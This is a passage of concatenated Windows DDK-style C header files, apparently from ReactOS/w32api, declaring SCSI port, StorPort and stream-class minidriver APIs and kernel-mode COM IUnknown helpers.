ScsiPortWritePortBufferUlong(
  IN PULONG Port,
  IN PULONG Buffer,
  IN ULONG Count);

SCSIPORTAPI
VOID
NTAPI
ScsiPortWritePortBufferUshort(
  IN PUSHORT Port,
  IN PUSHORT Buffer,
  IN ULONG Count);

SCSIPORTAPI
VOID
NTAPI
ScsiPortWriteRegisterUchar(
  IN PUCHAR Register,
  IN UCHAR Value);

SCSIPORTAPI
VOID
NTAPI
ScsiPortWriteRegisterUlong(
  IN PULONG Register,
  IN ULONG Value);

SCSIPORTAPI
VOID
NTAPI
ScsiPortWriteRegisterUshort(
  IN PUSHORT Register,
  IN USHORT Value);

SCSIPORTAPI
VOID
NTAPI
ScsiPortWriteRegisterBufferUchar(
  IN PUCHAR Register,
  IN PUCHAR Buffer,
  IN ULONG Count);

SCSIPORTAPI
VOID
NTAPI
ScsiPortWriteRegisterBufferUlong(
  IN PULONG Register,
  IN PULONG Buffer,
  IN ULONG Count);

SCSIPORTAPI
VOID
NTAPI
ScsiPortWriteRegisterBufferUshort(
  IN PUSHORT Register,
  IN PUSHORT Buffer,
  IN ULONG Count);

SCSIPORTAPI
VOID
NTAPI
ScsiPortMoveMemory(
  IN PVOID WriteBuffer,
  IN PVOID ReadBuffer,
  IN ULONG Length);

#endif /* defined(_M_AMD64) */

#ifdef __cplusplus
}
#endif

#endif /* _NTSRB_ */

```

`include/ddk/stdunk.h`:

```h
/*
    ReactOS Kernel-Mode COM
    IUnknown implementations

    This file is in the public domain.

    AUTHORS
        Andrew Greenwood
*/

#ifndef STDUNK_H
#define STDUNK_H

#include <punknown.h>

/* ===============================================================
    INonDelegatingUnknown interface
*/

DECLARE_INTERFACE(INonDelegatingUnknown)
{
    STDMETHOD_(NTSTATUS, NonDelegatingQueryInterface)( THIS_
        IN  REFIID,
        OUT PVOID*) PURE;

    STDMETHOD_(ULONG, NonDelegatingAddRef)( THIS ) PURE;
    STDMETHOD_(ULONG, NonDelegatingRelease)( THIS ) PURE;
};

typedef INonDelegatingUnknown *PNONDELEGATINGUNKNOWN;


/* ===============================================================
    CUnknown declaration / definition

    There are 2 variants for this, and I'm not sure if the C
    version is correct.
*/

#ifdef __cplusplus

class CUnknown : public INonDelegatingUnknown
{
    private :
        LONG m_ref_count;
        PUNKNOWN m_outer_unknown;

    public :
        /* CUnknown */
        CUnknown(PUNKNOWN pUnknownOuter);
        virtual ~CUnknown();

        PUNKNOWN GetOuterUnknown()
        { return m_outer_unknown; }

        /* INonDelegatingUnknown */
        STDMETHODIMP_(ULONG) NonDelegatingAddRef();
        STDMETHODIMP_(ULONG) NonDelegatingRelease();

        STDMETHODIMP_(NTSTATUS) NonDelegatingQueryInterface(
            REFIID  rIID,
            PVOID* ppVoid);
};

#define DECLARE_STD_UNKNOWN() \
    STDMETHODIMP_(NTSTATUS) NonDelegatingQueryInterface( \
        REFIID iid, \
        PVOID* ppvObject); \
\
    STDMETHODIMP_(NTSTATUS) QueryInterface( \
        REFIID riid, \
        void** ppv) \
    { \
        return GetOuterUnknown()->QueryInterface(riid, ppv); \
    } \
\
    STDMETHODIMP_(ULONG) AddRef() \
    { \
        return GetOuterUnknown()->AddRef(); \
    } \
\
    STDMETHODIMP_(ULONG) Release() \
    { \
        return GetOuterUnknown()->Release(); \
    }

#define DEFINE_STD_CONSTRUCTOR(classname) \
    classname(PUNKNOWN outer_unknown) \
    : CUnknown(outer_unknown) \
    { }

#else   /* Not C++ - this is probably very buggy... */

NTSTATUS
STDMETHODCALLTYPE
Unknown_QueryInterface(
    IUnknown* this,
    IN  REFIID refiid,
    OUT PVOID* output);

ULONG
STDMETHODCALLTYPE
Unknown_AddRef(
    IUnknown* unknown_this);

ULONG
STDMETHODCALLTYPE
Unknown_Release(
    IUnknown* unknown_this);

typedef struct CUnknown
{
    __GNU_EXTENSION union
    {
        IUnknown IUnknown;
        INonDelegatingUnknown INonDelegatingUnknown;
    };

    LONG m_ref_count;
    PUNKNOWN m_outer_unknown;
} CUnknown;

#endif  /* __cplusplus */



#ifdef __cplusplus


/* ===============================================================
    Construction helpers
*/

#define QICAST(typename) \
    PVOID( (typename) (this) )

#define QICASTUNKNOWN(typename) \
    PVOID( PUNKNOWN( (typename) (this) ) )

#define STD_CREATE_BODY_WITH_TAG_(classname, unknown, outer_unknown, pool_type, tag, base) \
    classname *new_ptr = new(pool_type, tag) classname(outer_unknown); \
\
    if ( ! new_ptr ) \
        return STATUS_INSUFFICIENT_RESOURCES; \
\
    *unknown = PUNKNOWN((base)(new_ptr)); \
    (*unknown)->AddRef(); \
    return STATUS_SUCCESS

#define STD_CREATE_BODY_WITH_TAG(classname, unknown, outer_unknown, pool_type, tag, base) \
    STD_CREATE_BODY_WITH_TAG_(classname, unknown, outer_unknown, pool_type, tag, PUNKNOWN)

#define STD_CREATE_BODY_(classname, unknown, outer_unknown, pool_type, base) \
    STD_CREATE_BODY_WITH_TAG_(classname, unknown, outer_unknown, pool_type, 'rCcP', base)

#define STD_CREATE_BODY(classname, unknown, outer_unknown, pool_type) \
    STD_CREATE_BODY_(classname, unknown, outer_unknown, pool_type, PUNKNOWN)


/* ===============================================================
    Custom "new" and "delete" C++ operators
*/

#ifndef _NEW_DELETE_OPERATORS_
#define _NEW_DELETE_OPERATORS_

inline PVOID
KCOM_New(
    size_t size,
    POOL_TYPE pool_type,
    ULONG tag)
{
    PVOID result;

    result = ExAllocatePoolWithTag(pool_type, size, tag);

    if ( result )
        RtlZeroMemory(result, size);

    return result;
}

inline PVOID
operator new (
    size_t  size,
    POOL_TYPE pool_type)
{
    return KCOM_New(size, pool_type, 'wNcP');
}

inline PVOID
operator new (
    size_t size,
    POOL_TYPE pool_type,
    ULONG tag)
{
    return KCOM_New(size, pool_type, tag);
}

inline void __cdecl
operator delete(
    PVOID ptr)
{
    ExFreePool(ptr);
}

#endif  /* ALLOCATION_OPERATORS_DEFINED */


#else   /* Being compiled with C */


#endif  /* __cplusplus */

#endif  /* include guard */

```

`include/ddk/storport.h`:

```h
/*
 * storport.h
 *
 * StorPort interface
 *
 * This file is part of the w32api package.
 *
 * Contributors:
 *   Created by Casper S. Hornstrup <chorns@users.sourceforge.net>
 *
 * THIS SOFTWARE IS NOT COPYRIGHTED
 *
 * This source code is offered for use in the public domain. You may
 * use, modify or distribute it freely.
 *
 * This code is distributed in the hope that it will be useful but
 * WITHOUT ANY WARRANTY. ALL WARRANTIES, EXPRESS OR IMPLIED ARE HEREBY
 * DISCLAIMED. This includes but is not limited to warranties of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 *
 */

#ifndef __STORPORT_H
#define __STORPORT_H

#include "srb.h"

#ifdef __cplusplus
extern "C" {
#endif

#if defined(_STORPORT_)
#define STORPORTAPI
#else
#define STORPORTAPI DECLSPEC_IMPORT
#endif


typedef PHYSICAL_ADDRESS STOR_PHYSICAL_ADDRESS;

typedef struct _STOR_SCATTER_GATHER_ELEMENT {
	STOR_PHYSICAL_ADDRESS  PhysicalAddress;
	ULONG  Length;
	ULONG_PTR  Reserved;
} STOR_SCATTER_GATHER_ELEMENT, *PSTOR_SCATTER_GATHER_ELEMENT;

typedef struct _STOR_SCATTER_GATHER_LIST {
    ULONG  NumberOfElements;
    ULONG_PTR  Reserved;
    STOR_SCATTER_GATHER_ELEMENT  List[0];
} STOR_SCATTER_GATHER_LIST, *PSTOR_SCATTER_GATHER_LIST;

typedef struct _SCSI_WMI_REQUEST_BLOCK {
  USHORT  Length;
  UCHAR  Function;
  UCHAR  SrbStatus;
  UCHAR  WMISubFunction;
  UCHAR  PathId;
  UCHAR  TargetId;
  UCHAR  Lun;
  UCHAR  Reserved1;
  UCHAR  WMIFlags;
  UCHAR  Reserved2[2];
  ULONG  SrbFlags;
  ULONG  DataTransferLength;
  ULONG  TimeOutValue;
  PVOID  DataBuffer;
  PVOID  DataPath;
  PVOID  Reserved3;
  PVOID  OriginalRequest;
  PVOID  SrbExtension;
  ULONG  Reserved4;
  UCHAR  Reserved5[16];
} SCSI_WMI_REQUEST_BLOCK, *PSCSI_WMI_REQUEST_BLOCK;


STORPORTAPI
ULONG
NTAPI
StorPortInitialize(
  IN PVOID  Argument1,
  IN PVOID  Argument2,
  IN PHW_INITIALIZATION_DATA  HwInitializationData,
  IN PVOID  Unused);

STORPORTAPI
VOID
NTAPI
StorPortFreeDeviceBase(
  IN PVOID  HwDeviceExtension,
  IN PVOID  MappedAddress);

STORPORTAPI
ULONG
NTAPI
StorPortGetBusData(
  IN PVOID  DeviceExtension,
  IN ULONG  BusDataType,
  IN ULONG  SystemIoBusNumber,
  IN ULONG  SlotNumber,
  IN PVOID  Buffer,
  IN ULONG  Length);

STORPORTAPI
ULONG
NTAPI
StorPortSetBusDataByOffset(
  IN PVOID  DeviceExtension,
  IN ULONG   BusDataType,
  IN ULONG  SystemIoBusNumber,
  IN ULONG  SlotNumber,
  IN PVOID  Buffer,
  IN ULONG  Offset,
  IN ULONG  Length);

STORPORTAPI
PVOID
NTAPI
StorPortGetDeviceBase(
  IN PVOID  HwDeviceExtension,
  IN INTERFACE_TYPE  BusType,
  IN ULONG  SystemIoBusNumber,
  IN SCSI_PHYSICAL_ADDRESS  IoAddress,
  IN ULONG  NumberOfBytes,
  IN BOOLEAN  InIoSpace);

STORPORTAPI
PVOID
NTAPI
StorPortGetLogicalUnit(
  IN PVOID  HwDeviceExtension,
  IN UCHAR  PathId,
  IN UCHAR  TargetId,
  IN UCHAR  Lun);

STORPORTAPI
PSCSI_REQUEST_BLOCK
NTAPI
StorPortGetSrb(
  IN PVOID  DeviceExtension,
  IN UCHAR  PathId,
  IN UCHAR  TargetId,
  IN UCHAR  Lun,
  IN LONG  QueueTag);

STORPORTAPI
STOR_PHYSICAL_ADDRESS
NTAPI
StorPortGetPhysicalAddress(
  IN PVOID  HwDeviceExtension,
  IN PSCSI_REQUEST_BLOCK  Srb,
  IN PVOID  VirtualAddress,
  OUT ULONG  *Length);

STORPORTAPI
PVOID
NTAPI
StorPortGetVirtualAddress(
  IN PVOID  HwDeviceExtension,
  IN STOR_PHYSICAL_ADDRESS  PhysicalAddress);

STORPORTAPI
PVOID
NTAPI
StorPortGetUncachedExtension(
  IN PVOID HwDeviceExtension,
  IN PPORT_CONFIGURATION_INFORMATION ConfigInfo,
  IN ULONG NumberOfBytes);

STORPORTAPI
VOID
__cdecl
StorPortNotification(
  IN SCSI_NOTIFICATION_TYPE  NotificationType,
  IN PVOID  HwDeviceExtension,
  IN ...);

STORPORTAPI
VOID
NTAPI
StorPortLogError(
  IN PVOID  HwDeviceExtension,
  IN PSCSI_REQUEST_BLOCK  Srb OPTIONAL,
  IN UCHAR  PathId,
  IN UCHAR  TargetId,
  IN UCHAR  Lun,
  IN ULONG  ErrorCode,
  IN ULONG  UniqueId);

STORPORTAPI
VOID
NTAPI
StorPortCompleteRequest(
  IN PVOID  HwDeviceExtension,
  IN UCHAR  PathId,
  IN UCHAR  TargetId,
  IN UCHAR  Lun,
  IN UCHAR  SrbStatus);

STORPORTAPI
VOID
NTAPI
StorPortMoveMemory(
  IN PVOID  WriteBuffer,
  IN PVOID  ReadBuffer,
  IN ULONG  Length);

STORPORTAPI
VOID
NTAPI
StorPortStallExecution(
  IN ULONG  Delay);

STORPORTAPI
STOR_PHYSICAL_ADDRESS
NTAPI
StorPortConvertUlong64ToPhysicalAddress(
  IN ULONG64  UlongAddress);

STORPORTAPI
ULONG64
NTAPI
StorPortConvertPhysicalAddressToUlong64(
  IN STOR_PHYSICAL_ADDRESS  Address);

STORPORTAPI
BOOLEAN
NTAPI
StorPortValidateRange(
  IN PVOID  HwDeviceExtension,
  IN INTERFACE_TYPE  BusType,
  IN ULONG  SystemIoBusNumber,
  IN STOR_PHYSICAL_ADDRESS  IoAddress,
  IN ULONG  NumberOfBytes,
  IN BOOLEAN  InIoSpace);

STORPORTAPI
VOID
__cdecl
StorPortDebugPrint(
  IN ULONG  DebugPrintLevel,
  IN PCCHAR  DebugMessage,
  IN ...);

STORPORTAPI
UCHAR
NTAPI
StorPortReadPortUchar(
  IN PUCHAR  Port);

STORPORTAPI
ULONG
NTAPI
StorPortReadPortUlong(
  IN PULONG  Port);

STORPORTAPI
USHORT
NTAPI
StorPortReadPortUshort(
  IN PUSHORT  Port);

STORPORTAPI
UCHAR
NTAPI
StorPortReadRegisterUchar(
  IN PUCHAR  Register);

STORPORTAPI
ULONG
NTAPI
StorPortReadRegisterUlong(
  IN PULONG  Register);

STORPORTAPI
USHORT
NTAPI
StorPortReadRegisterUshort(
  IN PUSHORT  Register);

STORPORTAPI
VOID
NTAPI
StorPortWritePortUchar(
  IN PUCHAR  Port,
  IN UCHAR  Value);

STORPORTAPI
VOID
NTAPI
StorPortWritePortUlong(
  IN PULONG  Port,
  IN ULONG  Value);

STORPORTAPI
VOID
NTAPI
StorPortWritePortUshort(
  IN PUSHORT  Port,
  IN USHORT  Value);

STORPORTAPI
VOID
NTAPI
StorPortWriteRegisterUchar(
  IN PUCHAR  Port,
  IN UCHAR  Value);

STORPORTAPI
VOID
NTAPI
StorPortWriteRegisterUlong(
  IN PULONG  Port,
  IN ULONG  Value);

STORPORTAPI
VOID
NTAPI
StorPortWriteRegisterUshort(
  IN PUSHORT  Port,
  IN USHORT  Value);

STORPORTAPI
BOOLEAN
NTAPI
StorPortPauseDevice(
  IN PVOID  HwDeviceExtension,
  IN UCHAR  PathId,
  IN UCHAR  TargetId,
  IN UCHAR  Lun,
  IN ULONG  TimeOut);

STORPORTAPI
BOOLEAN
NTAPI
StorPortResumeDevice(
  IN PVOID  HwDeviceExtension,
  IN UCHAR  PathId,
  IN UCHAR  TargetId,
  IN UCHAR  Lun);

STORPORTAPI
BOOLEAN
NTAPI
StorPortPause(
  IN PVOID  HwDeviceExtension,
  IN ULONG  TimeOut);

STORPORTAPI
BOOLEAN
NTAPI
StorPortResume(
  IN PVOID  HwDeviceExtension);

STORPORTAPI
BOOLEAN
NTAPI
StorPortDeviceBusy(
  IN PVOID  HwDeviceExtension,
  IN UCHAR  PathId,
  IN UCHAR  TargetId,
  IN UCHAR  Lun,
  IN ULONG  RequestsToComplete);

STORPORTAPI
BOOLEAN
NTAPI
StorPortDeviceReady(
  IN PVOID  HwDeviceExtension,
  IN UCHAR  PathId,
  IN UCHAR  TargetId,
  IN UCHAR  Lun);

STORPORTAPI
BOOLEAN
NTAPI
StorPortBusy(
  IN PVOID  HwDeviceExtension,
  IN ULONG  RequestsToComplete);

STORPORTAPI
BOOLEAN
NTAPI
StorPortReady(
  IN PVOID  HwDeviceExtension);

STORPORTAPI
PSTOR_SCATTER_GATHER_LIST
NTAPI
StorPortGetScatterGatherList(
  IN PVOID  DeviceExtension,
  IN PSCSI_REQUEST_BLOCK  Srb);

typedef BOOLEAN
(NTAPI *PSTOR_SYNCHRONIZED_ACCESS)(
  IN PVOID  HwDeviceExtension,
  IN PVOID  Context);

STORPORTAPI
VOID
NTAPI
StorPortSynchronizeAccess(
  IN PVOID  HwDeviceExtension,
  IN PSTOR_SYNCHRONIZED_ACCESS  SynchronizedAccessRoutine,
  IN PVOID  Context);

#if DBG
#define DebugPrint(x) StorPortDebugPrint x
#else
#define DebugPrint(x)
#endif

#ifdef __cplusplus
}
#endif

#endif /* __STORPORT_H */

```

`include/ddk/strmini.h`:

```h
#ifndef _STREAM_H
#define _STREAM_H

#include <ntddk.h>
#include <windef.h>
#include <ks.h>

#if defined(_ARM_)
#define STREAMAPI
#else
#define STREAMAPI __stdcall
#endif

#define STREAM_SYSTEM_TIME_MASK   ((STREAM_SYSTEM_TIME)0x00000001FFFFFFFF)

typedef enum {
  DebugLevelFatal = 0,
  DebugLevelError,
  DebugLevelWarning,
  DebugLevelInfo,
  DebugLevelTrace,
  DebugLevelVerbose,
  DebugLevelMaximum
} STREAM_DEBUG_LEVEL;


#if DBG

#define DebugPrint(x) StreamClassDebugPrint x
#define DEBUG_BREAKPOINT() DbgBreakPoint()
#define DEBUG_ASSERT(exp) \
            if ( !(exp) ) { \
                StreamClassDebugAssert( __FILE__, __LINE__, #exp, exp); \
            }
#else

#define DebugPrint(x)
#define DEBUG_BREAKPOINT()
#define DEBUG_ASSERT(exp)

#endif

typedef PHYSICAL_ADDRESS STREAM_PHYSICAL_ADDRESS, *PSTREAM_PHYSICAL_ADDRESS;
__GNU_EXTENSION typedef unsigned __int64 STREAM_SYSTEM_TIME, *PSTREAM_SYSTEM_TIME;
__GNU_EXTENSION typedef unsigned __int64 STREAM_TIMESTAMP, *PSTREAM_TIMESTAMP;

typedef enum {
  TIME_GET_STREAM_TIME,
  TIME_READ_ONBOARD_CLOCK,
  TIME_SET_ONBOARD_CLOCK
} TIME_FUNCTION;

typedef struct _HW_TIME_CONTEXT {
  struct _HW_DEVICE_EXTENSION *HwDeviceExtension;
  struct _HW_STREAM_OBJECT *HwStreamObject;
  TIME_FUNCTION Function;
  ULONGLONG Time;
  ULONGLONG SystemTime;
} HW_TIME_CONTEXT, *PHW_TIME_CONTEXT;

typedef struct _HW_EVENT_DESCRIPTOR {
  BOOLEAN Enable;
  PKSEVENT_ENTRY EventEntry;
  PKSEVENTDATA EventData;
  __GNU_EXTENSION union {
    struct _HW_STREAM_OBJECT * StreamObject;
    struct _HW_DEVICE_EXTENSION *DeviceExtension;
  };
  ULONG EnableEventSetIndex;
  PVOID HwInstanceExtension;
  ULONG Reserved;
} HW_EVENT_DESCRIPTOR, *PHW_EVENT_DESCRIPTOR;

struct _HW_STREAM_REQUEST_BLOCK;

typedef VOID (STREAMAPI * PHW_RECEIVE_STREAM_DATA_SRB) (IN struct _HW_STREAM_REQUEST_BLOCK * SRB);
typedef VOID (STREAMAPI * PHW_RECEIVE_STREAM_CONTROL_SRB) (IN struct _HW_STREAM_REQUEST_BLOCK  * SRB);
typedef NTSTATUS (STREAMAPI * PHW_EVENT_ROUTINE) (IN PHW_EVENT_DESCRIPTOR EventDescriptor);
typedef VOID (STREAMAPI * PHW_CLOCK_FUNCTION) (IN PHW_TIME_CONTEXT HwTimeContext);

typedef struct _HW_CLOCK_OBJECT {
  PHW_CLOCK_FUNCTION HwClockFunction;
  ULONG ClockSupportFlags;
  ULONG Reserved[2];
} HW_CLOCK_OBJECT, *PHW_CLOCK_OBJECT;

#define CLOCK_SUPPORT_CAN_SET_ONBOARD_CLOCK 0x1
#define CLOCK_SUPPORT_CAN_READ_ONBOARD_CLOCK 0x2
#define CLOCK_SUPPORT_CAN_RETURN_STREAM_TIME 0x4

typedef struct _HW_STREAM_OBJECT {
  ULONG           SizeOfThisPacket;
  ULONG           StreamNumber;
  PVOID           HwStreamExtension;
  PHW_RECEIVE_STREAM_DATA_SRB ReceiveDataPacket;
  PHW_RECEIVE_STREAM_CONTROL_SRB ReceiveControlPacket;
  HW_CLOCK_OBJECT HwClockObject;
  BOOLEAN         Dma;
  BOOLEAN         Pio;
  PVOID           HwDeviceExtension;
  ULONG    StreamHeaderMediaSpecific;
  ULONG    StreamHeaderWorkspace;
  BOOLEAN Allocator;
  PHW_EVENT_ROUTINE HwEventRoutine;
  ULONG Reserved[2];
} HW_STREAM_OBJECT, *PHW_STREAM_OBJECT;

typedef struct _HW_STREAM_HEADER {
  ULONG           NumberOfStreams;
  ULONG           SizeOfHwStreamInformation;
  ULONG           NumDevPropArrayEntries;
  PKSPROPERTY_SET DevicePropertiesArray;
  ULONG           NumDevEventArrayEntries;
  PKSEVENT_SET    DeviceEventsArray;
  PKSTOPOLOGY     Topology;
  PHW_EVENT_ROUTINE DeviceEventRoutine;
  LONG            NumDevMethodArrayEntries;
  PKSMETHOD_SET   DeviceMethodsArray;
} HW_STREAM_HEADER, *PHW_STREAM_HEADER;

typedef struct _HW_STREAM_INFORMATION {
  ULONG           NumberOfPossibleInstances;
  KSPIN_DATAFLOW  DataFlow;
  BOOLEAN         DataAccessible;
  ULONG           NumberOfFormatArrayEntries;
  PKSDATAFORMAT*  StreamFormatsArray;
  PVOID           ClassReserved[4];
  ULONG           NumStreamPropArrayEntries;
  PKSPROPERTY_SET StreamPropertiesArray;
  ULONG           NumStreamEventArrayEntries;
  PKSEVENT_SET    StreamEventsArray;
  GUID*                   Category;
  GUID*                   Name;
  ULONG                   MediumsCount;
  const KSPIN_MEDIUM*     Mediums;
  BOOLEAN         BridgeStream;
  ULONG Reserved[2];
} HW_STREAM_INFORMATION, *PHW_STREAM_INFORMATION;


typedef struct _HW_STREAM_DESCRIPTOR {
  HW_STREAM_HEADER StreamHeader;
  HW_STREAM_INFORMATION StreamInfo;
} HW_STREAM_DESCRIPTOR, *PHW_STREAM_DESCRIPTOR;

typedef struct _STREAM_TIME_REFERENCE {
  STREAM_TIMESTAMP CurrentOnboardClockValue;
  LARGE_INTEGER    OnboardClockFrequency;
  LARGE_INTEGER    CurrentSystemTime;
  ULONG Reserved[2];
} STREAM_TIME_REFERENCE, *PSTREAM_TIME_REFERENCE;

typedef struct _STREAM_DATA_INTERSECT_INFO {
  ULONG StreamNumber;
  PKSDATARANGE DataRange;
  PVOID   DataFormatBuffer;
  ULONG  SizeOfDataFormatBuffer;
} STREAM_DATA_INTERSECT_INFO, *PSTREAM_DATA_INTERSECT_INFO;

typedef struct _STREAM_PROPERTY_DESCRIPTOR {
  PKSPROPERTY     Property;
  ULONG           PropertySetID;
  PVOID           PropertyInfo;
  ULONG           PropertyInputSize;
  ULONG           PropertyOutputSize;
} STREAM_PROPERTY_DESCRIPTOR, *PSTREAM_PROPERTY_DESCRIPTOR;

typedef struct _STREAM_METHOD_DESCRIPTOR {
  ULONG		MethodSetID;
  PKSMETHOD	Method;
  PVOID		MethodInfo;
  LONG		MethodInputSize;
  LONG		MethodOutputSize;
} STREAM_METHOD_DESCRIPTOR, *PSTREAM_METHOD_DESCRIPTOR;

#define STREAM_REQUEST_BLOCK_SIZE sizeof(STREAM_REQUEST_BLOCK)

typedef enum _SRB_COMMAND {
  SRB_READ_DATA,
  SRB_WRITE_DATA, 
  SRB_GET_STREAM_STATE,
  SRB_SET_STREAM_STATE,
  SRB_SET_STREAM_PROPERTY,
  SRB_GET_STREAM_PROPERTY,
  SRB_OPEN_MASTER_CLOCK,

  SRB_INDICATE_MASTER_CLOCK,
  SRB_UNKNOWN_STREAM_COMMAND,
  SRB_SET_STREAM_RATE,
  SRB_PROPOSE_DATA_FORMAT,
  SRB_CLOSE_MASTER_CLOCK,
  SRB_PROPOSE_STREAM_RATE,
  SRB_SET_DATA_FORMAT,
  SRB_GET_DATA_FORMAT,
  SRB_BEGIN_FLUSH,
  SRB_END_FLUSH,

  SRB_GET_STREAM_INFO = 0x100,
  SRB_OPEN_STREAM,
  SRB_CLOSE_STREAM,
  SRB_OPEN_DEVICE_INSTANCE,
  SRB_CLOSE_DEVICE_INSTANCE,
  SRB_GET_DEVICE_PROPERTY,
  SRB_SET_DEVICE_PROPERTY,
  SRB_INITIALIZE_DEVICE,
  SRB_CHANGE_POWER_STATE,
  SRB_UNINITIALIZE_DEVICE,
  SRB_UNKNOWN_DEVICE_COMMAND,
  SRB_PAGING_OUT_DRIVER,
  SRB_GET_DATA_INTERSECTION,
  SRB_INITIALIZATION_COMPLETE,
  SRB_SURPRISE_REMOVAL

#if (NTDDI_VERSION >= NTDDI_WINXP)
 ,SRB_DEVICE_METHOD
 ,SRB_STREAM_METHOD
#if ( (NTDDI_VERSION >= NTDDI_WINXPSP2) && (NTDDI_VERSION < NTDDI_WS03) ) || (NTDDI_VERSION >= NTDDI_WS03SP1)
 ,SRB_NOTIFY_IDLE_STATE
#endif
#endif
} SRB_COMMAND;

typedef struct {
  PHYSICAL_ADDRESS    PhysicalAddress;
  ULONG               Length;
} KSSCATTER_GATHER, *PKSSCATTER_GATHER;


typedef struct _HW_STREAM_REQUEST_BLOCK {
  ULONG           SizeOfThisPacket;
  SRB_COMMAND     Command;
  NTSTATUS        Status;
  PHW_STREAM_OBJECT StreamObject;
  PVOID           HwDeviceExtension;
  PVOID           SRBExtension;

  union _CommandData {
    PKSSTREAM_HEADER DataBufferArray;
    PHW_STREAM_DESCRIPTOR StreamBuffer;
    KSSTATE         StreamState;
    PSTREAM_TIME_REFERENCE TimeReference;
    PSTREAM_PROPERTY_DESCRIPTOR PropertyInfo;
    PKSDATAFORMAT   OpenFormat;
    struct _PORT_CONFIGURATION_INFORMATION *ConfigInfo;
    HANDLE          MasterClockHandle;
    DEVICE_POWER_STATE DeviceState;
    PSTREAM_DATA_INTERSECT_INFO IntersectInfo;

#if (NTDDI_VERSION >= NTDDI_WINXP)
    PVOID	MethodInfo;
    LONG	FilterTypeIndex;
#if ( (NTDDI_VERSION >= NTDDI_WINXPSP2) && (NTDDI_VERSION < NTDDI_WS03) ) || (NTDDI_VERSION >= NTDDI_WS03SP1)
    BOOLEAN Idle;
#endif
#endif
  } CommandData;

  ULONG NumberOfBuffers;
  ULONG           TimeoutCounter;
  ULONG           TimeoutOriginal;
  struct _HW_STREAM_REQUEST_BLOCK *NextSRB;

  PIRP            Irp;
  ULONG           Flags;
  PVOID       HwInstanceExtension;

  __GNU_EXTENSION union {
    ULONG         NumberOfBytesToTransfer;
    ULONG         ActualBytesTransferred;
  };

  PKSSCATTER_GATHER ScatterGatherBuffer;
  ULONG           NumberOfPhysicalPages;
  ULONG           NumberOfScatterGatherElements;
  ULONG Reserved[1];
} HW_STREAM_REQUEST_BLOCK, *PHW_STREAM_REQUEST_BLOCK;

#define SRB_HW_FLAGS_DATA_TRANSFER  0x01
#define SRB_HW_FLAGS_STREAM_REQUEST 0x2

typedef enum {
  PerRequestExtension,
  DmaBuffer,
  SRBDataBuffer
} STREAM_BUFFER_TYPE;

typedef struct _ACCESS_RANGE {
  STREAM_PHYSICAL_ADDRESS RangeStart;
  ULONG           RangeLength;
  BOOLEAN         RangeInMemory;
  ULONG           Reserved;
} ACCESS_RANGE, *PACCESS_RANGE;

typedef struct _PORT_CONFIGURATION_INFORMATION {
  ULONG           SizeOfThisPacket;
  PVOID           HwDeviceExtension;
  PDEVICE_OBJECT  ClassDeviceObject;
  PDEVICE_OBJECT  PhysicalDeviceObject;
  ULONG           SystemIoBusNumber;
  INTERFACE_TYPE  AdapterInterfaceType;
  ULONG           BusInterruptLevel;
  ULONG           BusInterruptVector;
  KINTERRUPT_MODE InterruptMode;
  ULONG           DmaChannel;
  ULONG           NumberOfAccessRanges;
  PACCESS_RANGE   AccessRanges;
  ULONG           StreamDescriptorSize;
  PIRP            Irp;
  PKINTERRUPT  InterruptObject;
  PADAPTER_OBJECT  DmaAdapterObject;
  PDEVICE_OBJECT  RealPhysicalDeviceObject;
  ULONG Reserved[1];
} PORT_CONFIGURATION_INFORMATION, *PPORT_CONFIGURATION_INFORMATION;

typedef VOID (STREAMAPI * PHW_RECEIVE_DEVICE_SRB) (IN PHW_STREAM_REQUEST_BLOCK SRB);
typedef VOID (STREAMAPI * PHW_CANCEL_SRB) (IN PHW_STREAM_REQUEST_BLOCK SRB);
typedef VOID (STREAMAPI * PHW_REQUEST_TIMEOUT_HANDLER) (IN PHW_STREAM_REQUEST_BLOCK SRB);
typedef BOOLEAN (STREAMAPI * PHW_INTERRUPT) (IN PVOID DeviceExtension);
typedef VOID (STREAMAPI * PHW_TIMER_ROUTINE) (IN PVOID Context);
typedef VOID (STREAMAPI * PHW_PRIORITY_ROUTINE) (IN PVOID Context);
typedef VOID (STREAMAPI * PHW_QUERY_CLOCK_ROUTINE) (IN PHW_TIME_CONTEXT TimeContext);
typedef BOOLEAN (STREAMAPI * PHW_RESET_ADAPTER) (IN PVOID DeviceExtension);

typedef enum _STREAM_MINIDRIVER_STREAM_NOTIFICATION_TYPE {
  ReadyForNextStreamDataRequest,
  ReadyForNextStreamControlRequest,
  HardwareStarved,
  StreamRequestComplete,
  SignalMultipleStreamEvents,
  SignalStreamEvent,
  DeleteStreamEvent,
  StreamNotificationMaximum
} STREAM_MINIDRIVER_STREAM_NOTIFICATION_TYPE, *PSTREAM_MINIDRIVER_STREAM_NOTIFICATION_TYPE;

typedef enum _STREAM_MINIDRIVER_DEVICE_NOTIFICATION_TYPE {
  ReadyForNextDeviceRequest,
  DeviceRequestComplete,
  SignalMultipleDeviceEvents,
  SignalDeviceEvent,
  DeleteDeviceEvent,
#if (NTDDI_VERSION >= NTDDI_WINXP)
  SignalMultipleDeviceInstanceEvents,
#endif
  DeviceNotificationMaximum
} STREAM_MINIDRIVER_DEVICE_NOTIFICATION_TYPE, *PSTREAM_MINIDRIVER_DEVICE_NOTIFICATION_TYPE;

#define STREAM_CLASS_VERSION_20 0x0200

typedef struct _HW_INITIALIZATION_DATA {
#if (NTDDI_VERSION >= NTDDI_WINXP)
  __GNU_EXTENSION union {
    ULONG         HwInitializationDataSize;
    __GNU_EXTENSION struct {
      USHORT      SizeOfThisPacket;
      USHORT      StreamClassVersion;
    };
  };
#else
  ULONG           HwInitializationDataSize;
#endif /* NTDDI_VERSION >= NTDDI_WINXP */

  PHW_INTERRUPT   HwInterrupt;
  PHW_RECEIVE_DEVICE_SRB HwReceivePacket;
  PHW_CANCEL_SRB  HwCancelPacket;
  PHW_REQUEST_TIMEOUT_HANDLER HwRequestTimeoutHandler;
  ULONG           DeviceExtensionSize;
  ULONG           PerRequestExtensionSize;
  ULONG           PerStreamExtensionSize;
  ULONG           FilterInstanceExtensionSize;
  BOOLEAN         BusMasterDMA;
  BOOLEAN         Dma24BitAddresses;
  ULONG           BufferAlignment;
  BOOLEAN         TurnOffSynchronization;
  ULONG           DmaBufferSize;

#if (NTDDI_VERSION >= NTDDI_WINXP)
  ULONG		NumNameExtensions;
  PWCHAR	*NameExtensionArray;
#else
  ULONG Reserved[2];
#endif
} HW_INITIALIZATION_DATA, *PHW_INITIALIZATION_DATA;

